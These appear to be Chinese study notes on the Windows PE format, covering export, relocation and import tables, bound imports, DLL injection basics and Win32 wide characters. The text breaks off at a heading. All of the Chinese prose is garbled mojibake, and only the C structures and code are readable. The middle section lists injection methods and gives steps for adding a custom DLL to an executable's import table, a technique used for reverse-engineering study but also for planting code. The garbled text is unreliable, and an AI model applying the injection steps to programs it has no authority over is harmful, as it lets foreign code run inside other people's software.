·çš„ï¼Œæœ‰å“ªäº›ç¨‹åºä½¿ç”¨äº†æˆ‘è¿™ä¸ªç¨‹åºçš„å‡½æ•°ï¼Œä¹Ÿä¼šè®°å½•åœ¨ä¸€ä¸ªè¡¨å†…ï¼Œè¿™ä¸ªè¡¨æ˜¯å¯¼å‡ºè¡¨ã€‚\nå¦‚ä½•æ‰¾åˆ°å¯¼å‡ºè¡¨ï¼špeæ–‡ä»¶ç»“æ„ä¸­æœ€åä¸€ä¸ªç»“æ„ä¸­çš„ç¬¬ä¸€ä¸ªç»“æ„ä½“ï¼Œé‚£é‡Œå­˜æ”¾ç€å¯¼å‡ºè¡¨çš„åœ°å€(rva)å’Œå¤§å°(size)\nè¯·æ³¨æ„ï¼Œè¿™ä¸ªå¤§å°(size)æŒ‡çš„æ˜¯å¯¼å‡ºè¡¨ä¸­çš„æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹çš„å’Œå¤§å°ï¼ˆæ¯”å¦‚nameæŒ‡é’ˆæŒ‡å‘çš„å­—æ®µä»¥\\x00æˆªè‡³ï¼Œç­‰ç­‰çš„æ‰€æœ‰å­—æ®µå’ŒåŠ ä¸Šå›ºå®šçš„40ä¸ªå­—èŠ‚ï¼Œåªæ˜¯ç¼–è¯‘å™¨å¡«çš„å€¼ï¼Œæ— å®é™…æ„ä¹‰ï¼‰\nIMAGE_DIRECTORY_ENTRY_EXPORT struct_IMAGE_DATA_DIRECTORY { 0x00 DWORD VirtualAddress; 0x04 DWORD Size; } é€šè¿‡è¿™ä¸ªåœ°å€å°±å¯ä»¥æ‰¾åˆ°å¯¼å‡ºè¡¨ï¼Œç»“æ„å¦‚ä¸‹ï¼š\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //æœªä½¿ç”¨ DWORD TimeDateStamp; //æ—¶é—´æˆ³ WORD MajorVersion; //æœªä½¿ç”¨ WORD MinorVersion; //æœªä½¿ç”¨ DWORD Name; //æŒ‡å‘æ”¹å¯¼å‡ºè¡¨æ–‡ä»¶åå­—ç¬¦ä¸² DWORD Base; //å¯¼å‡ºè¡¨çš„èµ·å§‹åºå· DWORD NumberOfFunctions; //å¯¼å‡ºå‡½æ•°çš„ä¸ªæ•°(æ›´å‡†ç¡®æ¥è¯´æ˜¯AddressOfFunctionsçš„å…ƒç´ æ•°ï¼Œè€Œä¸æ˜¯å‡½æ•°ä¸ªæ•°) DWORD NumberOfNames; //ä»¥å‡½æ•°åå­—å¯¼å‡ºçš„å‡½æ•°ä¸ªæ•° DWORD AddressOfFunctions; //å¯¼å‡ºå‡½æ•°åœ°å€è¡¨RVA:å­˜å‚¨æ‰€æœ‰å¯¼å‡ºå‡½æ•°åœ°å€(è¡¨å…ƒç´ å®½åº¦ä¸º4ï¼Œæ€»å¤§å°NumberOfFunctions * 4) DWORD AddressOfNames; //å¯¼å‡ºå‡½æ•°åç§°è¡¨RVA:å­˜å‚¨å‡½æ•°åå­—ç¬¦ä¸²æ‰€åœ¨çš„åœ°å€(è¡¨å…ƒç´ å®½åº¦ä¸º4ï¼Œæ€»å¤§å°ä¸ºNumberOfNames * 4) DWORD AddressOfNameOrdinals; //å¯¼å‡ºå‡½æ•°åºå·è¡¨RVA:å­˜å‚¨å‡½æ•°åºå·(è¡¨å…ƒç´ å®½åº¦ä¸º2ï¼Œæ€»å¤§å°ä¸ºNumberOfNames * 2) } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 1.å¯¼å‡ºçš„å‡½æ•°è¦ä¹ˆç”¨åå­—å¯¼å‡ºï¼Œè¦ä¹ˆç”¨åºå·å¯¼å‡º(éšè—)ï¼Œæ€»æ•°ä¸ºNumberOfNamesçš„å€¼\nä¸€å…±æœ‰ä¸‰ä¸ªè¡¨ï¼Œåœ°å€è¡¨ï¼Œåºå·è¡¨ï¼Œåç§°è¡¨\nå…¶ä¸­ï¼šåºå·è¡¨çš„æ•°é‡ä¸åç§°è¡¨çš„æ•°é‡ç›¸åŒã€‚\næ¯”å¦‚ï¼š\nåœ°å€è¡¨ åºå·è¡¨(2å­—èŠ‚) åç§°è¡¨ addr1(knameA) 4 ADDR1(AAAA) addr2(knameB) 1 ADDR2(BBBB) addr3(knameC) 0 ADDR3(CCCC) 00000000 addr4(knameD) erDiagram Address_table { address addr1(knameA) address addr2(knameB) address addr3(knameC) address NULL address addr4(knameD) } Serial_number_table { number four number one number zero } Name_table { name ADDR1(AAAA) name ADDR2(BBBB) name ADDR3(CCCC) } é€šè¿‡åå­—æ‰¾å‡½æ•°æ—¶ï¼šï¼ˆæŒ‰ç…§åç§°æ‰¾å‡½æ•°åœ°å€ï¼‰\ngraph RL AAAA --\u003e 4 --\u003e knameD é¦–å…ˆéå†åç§°è¡¨ï¼Œæ¯”å¦‚æ‰¾åˆ°åç§°AAAAå‡½æ•°ï¼Œå‘ç°æ˜¯è¡¨ä¸­çš„ç¬¬0å·æˆå‘˜ã€‚ é€šè¿‡â‘ ä¸­çš„0ç›´æ¥æŸ¥è¯¢åºå·è¡¨ä¸­çš„0å·æˆå‘˜ï¼Œå‘ç°æ˜¯æ•°å­—4 é€šè¿‡â‘¡ä¸­çš„4ç›´æ¥æŸ¥æ‰¾åœ°å€è¡¨ä¸­çš„ç¬¬4å·æˆå‘˜ï¼Œä¸ºaddr4(knameD)ï¼Œæ‰€ä»¥knameDå°±æ˜¯AAAAï¼ˆä»0å¼€å§‹æ•°ï¼‰ ç›¸åè¿‡ç¨‹ï¼šï¼ˆçŸ¥é“å‡½æ•°åœ°å€æ‰¾å‡½æ•°åï¼‰\ngraph LR knameA --\u003e 0 --\u003e CCCC æ¯”å¦‚çŸ¥é“å‡½æ•°çš„åœ°å€ä¸ºaddr1(knameA)ï¼Œå‘ç°æ˜¯åœ°å€è¡¨ä¸­çš„ç¬¬0å·æˆå‘˜ã€‚ é€šè¿‡â‘ ä¸­çš„0ç›´æ¥æŸ¥è¯¢åºå·è¡¨ä¸­çš„æˆå‘˜å“ªä¸ªæ˜¯0ï¼Œå‘ç°æ˜¯ç¬¬äºŒä¸ªç´¢å¼• ç›´æ¥å¯¹åº”åç§°è¡¨çš„ç¬¬äºŒä¸ªç´¢å¼•ï¼Œæ‰€ä»¥ADDR3(CCCC)å°±æ˜¯addr1(knameA) é€šè¿‡åºå·æ‰¾å‡½æ•°æ—¶ï¼šï¼ˆæŒ‰ç…§åºå·æ‰¾å‡½æ•°åœ°å€ï¼‰\ngraph RL 4 --\u003e knameD å°†å¯¼å‡ºåºå·å‡å»å¯¼å‡ºè¡¨çš„èµ·å§‹åºå·(Baseçš„å€¼)ã€‚ å°†è¿™ä¸ªå€¼ç›´æ¥å¯¹åº”åœ°å€è¡¨ï¼Œå°±æ‰¾åˆ°äº†ã€‚ åºå·è¡¨ä¸åç§°è¡¨æ˜¯å¯¹åº”çš„ï¼Œåœ°å€è¡¨æ˜¯é åºå·è¡¨ç´¢å¼•å¾—åˆ°çš„\né‡å®šä½è¡¨ å¦‚æœä¸¤ä¸ªdllæ–‡ä»¶åœ¨å¯¼å…¥å†…å­˜æ—¶ï¼Œå¯¼å…¥åœ¨ç›¸åŒçš„ImageBaseçš„åç§»å¤„ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿåªéœ€è¦ä¿®æ­£å…¶ä¸­ä¸€ä¸ªdllæ–‡ä»¶çš„åç§»åœ¨æ²¡æœ‰æ–‡ä»¶å¯¼å…¥çš„å†…å­˜åç§»ï¼Œå³å¯ã€‚ä½†è¿™ä¸¤ä¸ªdllä¸­çš„å…¨å±€å˜é‡çš„ç¡¬ç¼–ç å¯èƒ½ä¼šæœ‰ç›¸åŒçš„åç§»ã€‚è¿™æ—¶å°±éœ€è¦ä½¿ç”¨é‡å®šä½è¡¨äº†\næ•°æ®ç›®å½•é¡¹çš„ç¬¬6ä¸ªç»“æ„ï¼Œå°±æ˜¯é‡å®šä½è¡¨ï¼ˆç›¸å¯¹äºæ˜ åƒåŸºå€çš„åç§»é‡ï¼‰ã€‚\nç»“æ„å¦‚ä¸‹ï¼š\ntypedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; //å­—èŠ‚ä¸ºå•ä½ } IMAGE_BASE_RELOCATION; è¿™ä¸ªç»“æ„ä½“ä¸­çš„ç¬¬äºŒä¸ªæˆå‘˜SizeOfBlockæ˜¯å½“å‰é‡å®šä½å—çš„æ€»å¤§å°ï¼Œå°±æ˜¯åŠ ä¸ŠVirtualAddressæˆå‘˜çš„å¤§å°ã€‚ å½“é‡åˆ°å…¨ä¸º\\x00æ—¶(8ä¸ª)ï¼Œè¯´æ˜å·²ç»ç»“æŸäº†ã€‚ æ¯”å¦‚å…¶ä¸­ä¸€ä¸ªé‡å®šä½å—å¦‚ä¸‹ï¼š\nVirtual Size 0011#### ######## 0011#### ######## 0011#### ######## 0011#### ######## è¯´æ˜ï¼šVirtualä»£è¡¨VirtualAddressæˆå‘˜ï¼ŒSize(0x10)ä»£è¡¨SizeOfBlockæˆå‘˜ï¼Œ#ä»£è¡¨ä¸€ä½çš„æ•°æ®ï¼Œä¸€ä¸ªæ¡†ä»£è¡¨ä¸€ä¸ªå­—èŠ‚ã€‚2^12=4096ï¼Œå³ä¸ºä¸€é¡µå¯¹é½çš„æ•°æ®ï¼Œæ‰€ä»¥ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚(16ä½å…¶ä¸­çš„ä½12ä½)æ¥å­˜æ”¾åœ°å€ï¼Œå…¶ä¸­çš„é«˜4ä½çš„ä½œç”¨æ˜¯ï¼šå½“é«˜4ä½çš„å€¼ä¸º3(0011=3ï¼Œä¸æ˜¯3æ—¶å°±æ˜¯åƒåœ¾ï¼)æ—¶ï¼Œè¯´æ˜è¯¥åœ°å€æœ‰æ„ä¹‰é‡å®šä½ï¼Œåº”å½“é‡å®šä½çš„å€¼=VirtualAddressæˆå‘˜+ä½12ä½\nç§»åŠ¨å¯¼å‡ºè¡¨ï¼Œé‡å®šå‘è¡¨ åœ¨DLLä¸­æ–°å¢ä¸€ä¸ªèŠ‚ï¼Œå¹¶è¿”å›æ–°å¢åçš„FOA å¤åˆ¶AddressOfFunctions\té•¿åº¦ï¼š4*NumberOfFunctions å¤åˆ¶AddressOfNameOrdinals\té•¿åº¦ï¼šNumberOfNames*2 å¤åˆ¶AddressOfNames\té•¿åº¦ï¼šNumberOfNames*4 å¤åˆ¶æ‰€æœ‰çš„å‡½æ•°å\té•¿åº¦ä¸ç¡®å®šï¼Œå¤åˆ¶æ—¶ç›´æ¥ä¿®å¤AddressOfNames å¤åˆ¶IMAGE_EXPORT_DIRECTORYç»“æ„ ä¿®å¤IMAGE_EXPORT_DIRECTORYç»“æ„ä¸­çš„\tAddressOfFunctions\tAddressOfNameOrdinals\tAddressOfNames ä¿®å¤ç›®å½•é¡¹ä¸­çš„å€¼ï¼ŒæŒ‡å‘æ–°çš„IMAGE_EXPORT_DIRECTORY å¯¼å…¥è¡¨ å¯¼å…¥è¡¨å°±åƒç¨‹åºçš„â€œå€Ÿç”¨æ¸…å•â€ï¼Œå‘Šè¯‰å®ƒè¿è¡Œæ—¶éœ€è¦è°ƒç”¨å“ªäº›å¤–éƒ¨å‡½æ•°ä»¥åŠä»å“ªé‡Œæ‰¾åˆ°å®ƒä»¬ã€‚\nä¾èµ–ä¸€ä¸ªæ¨¡å—å°±ä¼šæœ‰ä¸€ä¸ªå¯¼å…¥è¡¨ï¼Œæ‰€ä»¥å¯¼å…¥è¡¨æœ‰å¾ˆå¤šã€‚ é‡åˆ°è¿ç»­20ä¸ª\\x00è¯´æ˜å¯¼å…¥è¡¨ç»“æŸäº† ç»“æ„å¦‚ä¸‹ï¼š\ntypedef struct_IMAGE_IMPORT_DESCRIPTOR union { DWORD Characteristics; DWORD OriginalFirstThunk;\t//RVAæŒ‡å‘IMAGE_THUNK_DATAç»“æ„æ•°ç»„ }; DWORD TimeDateStamp;\t//æ—¶é—´æˆ³ DWORD ForwarderChain; DWORD Name;\t//RVA,æŒ‡å‘dlåå­—ï¼Œè¯¥åå­—å·²0ç»“å°¾ DWORD FirstThunk;\t//RVA,æŒ‡å‘IMAGE_THUNK_DATAç»“æ„æ•°ç»„ }IMAGE_IMPORT_DESCRIPTOR; å…¶ä¸­:\nOriginalFirstThunkæˆå‘˜å’ŒFirstThunkæˆå‘˜åˆåˆ†åˆ«æŒ‡å‘äº†INTï¼ˆå¯¼å…¥åç§°è¡¨ï¼‰å’ŒIATï¼ˆå¯¼å…¥åœ°å€è¡¨ï¼‰ï¼Œè¿™ä¸¤å¼ è¡¨ä½ç½®å’Œåç§°éƒ½ä¸åŒï¼Œä½†å†…å®¹å´ç›¸åŒï¼Œéƒ½èƒ½æ‰¾åˆ°å‡½æ•°åç§°ã€‚ å½“é‡åˆ°å…¨ä¸º\\x00æ—¶ï¼Œè¯´æ˜å·²ç»ç»“æŸäº†ã€‚ æˆå‘˜æœ‰å¤šå°‘ä¸ªï¼Œè¯¥ç¨‹åºå°±ä½¿ç”¨äº†è¿™ä¸ªdllä¸­çš„å¤šå°‘ä¸ªå‡½æ•°ã€‚ typedef struct_IMAGE_THUNK_DATA32 union{ PBYTE ForwarderString; PDWORD Function; DWORD Ordinal;\t//åºå· PIMAGE_IMPORT_BY_NAME AddressOfData; //æŒ‡å‘IMAGE_IMPORT_BY_NAME }u1; }IMAGE_THUNK_DATA32; åœ¨OriginalFirstThunkä¸­çš„IMAGE_THUNK_DATA32æˆå‘˜ã€‚åˆ¤æ–­æœ€é«˜æ˜¯å¦ä¸º1ï¼Œå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆé™¤å»æœ€é«˜ä½çš„å€¼å°±æ˜¯å‡½æ•°çš„å¯¼å‡ºåºå·(æŒ‰åºå·å¯¼å…¥)ï¼›å¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªRVAæŒ‡å‘IMAGE_IMPORT_BY_NAME\ntypedef struct_IMAGE_IMPORT_BY_NAME { WORD Hint;\t//å¯èƒ½ä¸ºç©º,ç¼–è¯‘å™¨å†³å®šå¦‚æœä¸ä¸ºç©ºæ˜¯å‡½æ•°åœ¨å¯¼å‡ºè¡¨ä¸­çš„ç´¢å¼• BYTE Name[1];\t//å‡½æ•°åç§°ï¼Œä»¥0ç»“å°¾ }IMAGE IMPORT BY NAME, *PIMAGE IMPORT BY NAME; Hintæˆå‘˜å¦‚æœä¸ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ‰¾å¯¼å‡ºè¡¨ä¸­åœ°å€è¡¨çš„ç´¢å¼•ï¼Œç›´æ¥å¯ä»¥æ‰¾åˆ°å‡½æ•°ã€‚\nHintæˆå‘˜å¦‚æœä¸ºç©ºï¼Œåˆ™é€šè¿‡Name[1]æ¥ç¡®å®šå‡½æ•°å«è¯´æ˜åå­—ï¼Œä¹‹æ‰€ä»¥æ˜¯1å­—èŠ‚ï¼Œæ˜¯å› ä¸ºå‡½æ•°ä¸çŸ¥é“å‡½æ•°åç§°çš„é•¿åº¦ï¼Œæ‰€ä»¥ç¡®å®šç¬¬ä¸€ä¸ªå­—èŠ‚ä¹‹åä¸€ç›´æ‰¾ï¼Œé‡åˆ°\\x00ç»“æŸï¼Œå°±æ˜¯å‡½æ•°çš„åç§°ã€‚\nç¡®å®šå‡½æ•°åœ°å€ï¼š\nåœ¨ä½¿ç”¨å…¶ä»–dllä¸­çš„å‡½æ•°ï¼Œä½¿ç”¨çš„calléƒ½æ˜¯é—´æ¥callã€‚é—´æ¥callä¼šæä¾›ä¸€ä¸ªåœ°å€ç¼–å·æ¥å­˜æ”¾å‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€æ‰€åœ¨çš„è¡¨å°±æ˜¯å¯¼å…¥åœ°å€è¡¨(IAT)ã€‚ PEæ–‡ä»¶åŠ è½½å‰åIATè¡¨ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¼šå­˜æ”¾å‡½æ•°çš„åœ°å€(ä¹Ÿå°±æ˜¯é€šè¿‡å‡½æ•°çš„åç§°è¿›è€Œå¾—åˆ°å‡½æ•°çš„åœ°å€)ã€‚ ä¸ºä»€ä¹ˆæœ‰ä¸¤æ¡çº¿ï¼Ÿå¦‚æœIATè¡¨çš„è¿™æ¡çº¿è¢«ç ´åï¼Œåˆ™å¯ä»¥é€šè¿‡INTè¡¨è¿›è¡Œä¿®æ­£ã€‚ ç»‘å®šå¯¼å…¥è¡¨ åœ¨ç³»ç»Ÿè‡ªæä¾›çš„.exeç¨‹åºä¸­ï¼Œå¯ä»¥å‘ç°IATè¡¨é‡Œé¢æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå¹¶ä¸”å’ŒINTè¡¨çš„å€¼ä¸åŒã€‚è¿™ä¸ªæƒ…å†µå…¶å®å¯ä»¥ç­‰ä»·äºPEæ–‡ä»¶åŠ è½½åçš„çŠ¶æ€ï¼Œå¯ä»¥æé«˜ç¨‹åºçš„æ‰§è¡Œé€Ÿåº¦ã€‚\nPEåŠ è½½EXEç›¸å…³çš„DLLæ—¶ï¼Œé¦–å…ˆä¼šæ ¹æ®IMAGE_IMPORT_DESCRIPTORç»“æ„ä¸­çš„TimeDateStampæ¥åˆ¤æ–­æ˜¯å¦è¦é‡æ–°è®¡ç®—IATè¡¨ä¸­çš„åœ°å€ã€‚\nTimeDateStamp çŠ¶æ€ 0 æœªç»‘å®š 1 å·²ç»‘å®šï¼ˆçœŸæ­£çš„ç»‘å®šæ—¶é—´ä¸ºIMAGE_BOUND_IMPORT_DESCRIPTORçš„TimeDateStampï¼‰ ç»“æ„å¦‚ä¸‹ï¼š\ntypedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR { DWORD TimeDateStamp; WORD OffsetModuleName; WORD NumberOfModuleForwarderRefs; // Array of zero or more IMAGE_BOUND_FORWARDER_REF follows } IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR; typedef struct _IMAGE_BOUND_FORWARDER_REF { DWORD TimeDateStamp; WORD OffsetModuleName; WORD Reserved; } IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF; æ³¨æ„ï¼šå¯¹åº”dllçš„åç§°æ˜¯ç¬¬ä¸€ä¸ª_IMAGE_BOUND_IMPORT_DESCRIPTORçš„åœ°å€ + å¯¹åº”çš„OffsetModuleName\nå½“IMAGE_BOUND_IMPORT_DESCRIPTORç»“æ„ä¸­çš„TimeDateStampä¸DLLæ–‡ä»¶æ ‡å‡†PEå¤´ä¸­çš„TimeDateStampå€¼ä¸ç›¸ç¬¦æ—¶ï¼Œæˆ–è€…DLLéœ€è¦é‡æ–°å®šä½çš„æ—¶å€™ï¼Œå°±ä¼šé‡æ–°è®¡ç®—IATä¸­çš„å€¼\næ³¨å…¥å…¥é—¨ å½“Exeè¢«åŠ è½½æ—¶ï¼Œç³»ç»Ÿä¼šæ ¹æ®Exeå¯¼å…¥è¡¨ä¿¡æ¯æ¥åŠ è½½éœ€è¦ç”¨åˆ°çš„DLLï¼Œå¯¼å…¥è¡¨æ³¨å…¥çš„åŸç†å°±æ˜¯ä¿®æ”¹exeå¯¼å…¥è¡¨ï¼Œå°†è‡ªå·±çš„DLLæ·»åŠ åˆ°exeçš„å¯¼å…¥è¡¨ä¸­ï¼Œè¿™æ ·exeè¿è¡Œæ—¶å¯ä»¥å°†è‡ªå·±çš„DLLåŠ è½½åˆ°exeçš„è¿›ç¨‹ç©ºé—´ã€‚\næ³¨å…¥çš„ç§ç±»ï¼š\næ³¨å†Œè¡¨æ³¨å…¥ å¯¼å…¥è¡¨æ³¨å…¥ ç‰¹æ´›ä¼Šæ³¨å…¥ è¿œç¨‹çº¿ç¨‹æ³¨å…¥ æ— DLLæ³¨å…¥ Apcæ³¨å…¥ WindowsæŒ‚é’©æ³¨å…¥DLL è¾“å…¥æ³•æ³¨å…¥ å¯¼å…¥è¡¨æ³¨å…¥çš„å®ç°æ­¥éª¤ï¼š\næ ¹æ®ç›®å½•é¡¹ï¼ˆç¬¬äºŒä¸ªå°±æ˜¯å¯¼å…¥è¡¨ï¼‰å¾—åˆ°å¯¼å…¥è¡¨ä¿¡æ¯ï¼š\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; //VirtualAddress :æŒ‡å‘å¯¼å…¥è¡¨ç»“æ„ //Size:å¯¼å…¥è¡¨çš„æ€»å¤§å° //è¿™ä¸¤ä¸ªå€¼éƒ½éœ€è¦ typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; }; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; æ–°å¢ä¸€ä¸ªå¯¼å…¥è¡¨éœ€è¦çš„ç©ºé—´ï¼š A:20å­—èŠ‚ B:16å­—èŠ‚\tC:å–å†³äºDLLåä¸²çš„é•¿åº¦+1 D:å–å†³äºå‡½æ•°åçš„é•¿åº¦+1+2 åˆ¤æ–­å“ªä¸€ä¸ªèŠ‚çš„ç©ºç™½åŒº \u003e Size(åŸå¯¼å…¥è¡¨çš„å¤§å°) + 20 + A + B + C + D å¦‚æœç©ºé—´ä¸å¤Ÿï¼šå¯ä»¥å°†C/D å­˜å‚¨åœ¨å…¶ä»–çš„ç©ºç™½åŒºä¹Ÿå°±æ˜¯ï¼Œåªè¦ç©ºç™½åŒº \u003e Size + 0x20å°±å¯ä»¥äº† å¦‚æœä»ç„¶ä¸å¤Ÿï¼Œå°±éœ€è¦æ‰©å¤§æœ€åä¸€ä¸ªèŠ‚ï¼Œæˆ–è€…æ–°å¢èŠ‚æ¥è§£å†³. å°†åŸå¯¼å…¥è¡¨å…¨éƒ¨Copyåˆ°ç©ºç™½åŒº\nåœ¨æ–°çš„å¯¼å…¥è¡¨åé¢ï¼Œè¿½åŠ ä¸€ä¸ªå¯¼å…¥è¡¨\nè¿½åŠ 8ä¸ªå­—èŠ‚çš„INTè¡¨å’Œ 8ä¸ªå­—èŠ‚çš„IATè¡¨\nè¿½åŠ ä¸€ä¸ªIMAGE_IMPORT_BY_NAMEç»“æ„ï¼Œå‰2ä¸ªå­—èŠ‚æ˜¯0åé¢æ˜¯å‡½æ•°åç§°å­—ç¬¦ä¸²\nå°†IMAGE_IMPORT_BY_NAMEç»“æ„çš„RVAèµ‹å€¼ç»™INTå’ŒIATè¡¨ä¸­çš„ç¬¬ä¸€é¡¹\nåˆ†é…ç©ºé—´å­˜å‚¨DLLåç§°å­—ç¬¦ä¸² å¹¶å°†è¯¥å­—ç¬¦ä¸²çš„RVAèµ‹å€¼ç»™Nameå±æ€§\nä¿®æ­£IMAGE_DATA_DIRECTORYç»“æ„çš„VirtualAddresså’ŒSize\nwin32 å®½å­—ç¬¦ æ¦‚è¿°ï¼š\nASCIIç¼–ç æ— æ³•æ»¡è¶³æˆ‘ä»¬è¾“å…¥çš„ä¸­æ–‡æ–‡å­—ã€‚ä¾¿å¼•å…¥äº†æ‰©å±•ASCIIè¡¨ï¼ŒåŸæ¥çš„ASCIIè¡¨è¿›è¡Œæ‰©å±•ï¼Œå°†0x80~0xffçš„ä¸¤ä¸ªç¬¦å·æ‹¼èµ·æ¥ç»„æˆæ–°çš„æ–‡å­—(GB2312)ï¼Œå°±å¯ä»¥æ˜¾ç¤ºä¸­æ–‡äº†ã€‚ä½†æ˜¯ä¸åŒå›½å®¶æœ‰ä¸åŒçš„è§„åˆ™ï¼Œé‚£ä¹ˆä¸­æ–‡æ–‡å­—å‘é€è¿‡å»ä¼šäº§ç”Ÿä¹±ç ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°±äº§ç”Ÿäº†Unicodeç¼–ç ï¼Œunicodeç¼–ç æ˜¯å°†ä¸–ç•Œä¸Šæ‰€æœ‰çš„å­—ç¬¦å»ºç«‹ä¸0~0x10ffffçš„å¯¹åº”ã€‚ä½†æ˜¯Unicodeç¼–ç é•¿åº¦å¯èƒ½çš„1æˆ–2æˆ–3å­—èŠ‚ï¼Œè¿™æ ·ä¸å¥½å­˜å‚¨ã€‚\nUTF-16:\nUTF-16ç¼–ç ä»¥16ä½æ— ç¬¦å·æ•´æ•°ä¸ºå•ä½ï¼Œæ³¨æ„æ˜¯16ä½ä¸ºä¸€ä¸ªå•ä½ï¼Œä¸è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦å°±åªæœ‰16ä½ã€‚è¿™ä¸ªè¦çœ‹å­—ç¬¦çš„Unicodeç¼–ç å¤„äºä»€ä¹ˆèŒƒå›´è€Œå®šï¼Œæœ‰å¯èƒ½æ˜¯2ä¸ªå­—èŠ‚ï¼Œä¹Ÿå¯èƒ½æ˜¯4ä¸ªå­—èŠ‚ç°åœ¨æœºå™¨ä¸Šçš„Unicodeç¼–ç ä¸€èˆ¬æŒ‡çš„å°±æ˜¯UTF-16ã€‚\nUTF-8:\nä¸åŒçš„16è¿›åˆ¶ç ç”¨ä¸åŒçš„UTF-8è§„åˆ™ç¼–ç \nUnicodeç¼–ç (6è¿›åˆ¶) UTF-8 å­—èŠ‚æµ(äºŒè¿›åˆ¶) 000000 - 00007F 0xxxxxxx 000080 - 0007FF 110xxxxx 10xxxxxx 000800 - 00FFFF 1110xxxx 10xxxxxx 10xxxxxx 010000 -10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx BOMï¼ˆByte Order Markï¼‰:\næ”¾åœ¨UTF-8æˆ–UTF-16ç¼–ç çš„å‰é¢ï¼Œè®©è®¡ç®—æœºçŸ¥é“è¿™æ˜¯ä»€ä¹ˆæ–¹å¼ç¼–ç çš„\nBOM UTF-8 EF BB BF UTF-16LE(å°ç«¯) FF FE UTF-16BE(å¤§ç«¯) FE FF cè¯­è¨€ä¸­çš„å®½å­—èŠ‚ï¼š\nchar szStr[]= \"ä¸­å›½\";\t//2D 4E FD 56 00\t(GB2312ç¼–ç ) wchar_t swzStr]=L\"ä¸­å›½\";\t//D6 D0 B9 FA 00 00\t(Unicodeç¼–ç )å®½å­—èŠ‚ æ³¨æ„ï¼šå®½å­—ç¬¦æ˜¯ä»¥00 00ä¸ºç»ˆæ­¢ç¬¦çš„ã€‚\nwin32 apiä¸­çš„å®½å­—èŠ‚ï¼š\nåœ¨win32ç¼–ç¨‹ä¸­éƒ½æ˜¯è§è¿‡çš„ç±»å‹ï¼Œåªä¸è¿‡æ˜¯æ¢äº†ä¸€ä¸ªåå­—è€Œå·²ã€‚ Windowsæä¾›çš„APIå‡¡æ˜¯éœ€è¦ä¼ é€’å­—ç¬¦ä¸²å‚æ•°çš„å‡½æ•°ï¼Œéƒ½ä¼šæä¾›ä¸¤ä¸ªç‰ˆæœ¬å’Œä¸€ä¸ªå®ï¼ˆæ¯”å¦‚ï¼šMessageboxA MessageboxWï¼‰ï¼Œä¸ºäº†ä½¿ASCIIç¼–ç å’ŒUnicodeç¼–ç æœ‰åŒºåˆ†ã€‚ å­—ç¬¦ç±»å‹ å­—ç¬¦ä¸²æŒ‡é’ˆ charï¼ŒCHAR PTSTR(LPTSTR)æŒ‡å‘å¤šå­—èŠ‚å­—ç¬¦ä¸² wchar_tï¼ŒWCHAR PTSTR(LPTSTR)æŒ‡å‘å®½å­—ç¬¦ä¸² å® TCHAR å® PTSTR(LPTSTR) ä¸ºå­—ç¬¦ä¸²æŒ‡é’ˆèµ‹å€¼ï¼š\nPSTR pszChar = \"china\";\t//å¤šå­—èŠ‚å­—ç¬¦ PWSTR pszWChar = L\"china\";\t//å®½å­—ç¬¦ PTSTR pszTChar = TEXT(\"china\");\t//å¦‚æœé¡¹ç›®æ˜¯ASCIIçš„ï¼Œç›¸å½“äº\"china\"ï¼›å¦‚æœé¡¹ç›®æ˜¯UNICODEï¼Œç›¸å½“äºL\"china\" å­—ç¬¦æ•°ç»„èµ‹å€¼ï¼š\nCHAR cha[] = \"ä¸­å›½\"; WCHAR chw[] = L\"ä¸­å›½\"; TCHAR cht[] = TEXT(\"ä¸­å›½\"); å‡½æ•°çš„ä¸åŒï¼š\næ™®é€š å®½å­—ç¬¦ åŠŸèƒ½ printf wprintf æ‰“å°åˆ°æ§åˆ¶å°å‡½æ•° strlen wcslen è·å–é•¿åº¦ strcpy wcscpy å­—ç¬¦ä¸²å¤åˆ¶ strcat wcscat å­—ç¬¦ä¸²æ‹¼æ¥ strcmp wcscmp å­—ç¬¦ä¸²æ¯”è¾ƒ strstr wcsstr å­—ç¬¦ä¸²æŸ¥æ‰¾ char wchar_t å¤šå­—èŠ‚å­—ç¬¦ç±»å‹ å®½å­—ç¬¦ç±»å‹ è°ƒè¯•å‡½æ•°ï¼š\n//.h void __cdecl OutputDebugStringF(const char *format, ...); #ifdef _DEBUG #define DbgPrintf OutputDebugStringF #else #define DbgPrintf #endif //.cpp void __cdecl OutputDebugStringF(const char *format, ...) { va_list vlArgs; char *strBuffer = (char*)GlobalAlloc(GPTR, 4096); va_start(vlArgs, format); _vsnprintf(strBuffer, 4096 - 1, format, vlArgs); va_end(vlArgs); strcat(strBuffer, \"\\n\"); OutputDebugStringA(strBuffer); GlobalFree(strBuffer); return; } äº‹ä»¶-æ¶ˆæ¯ 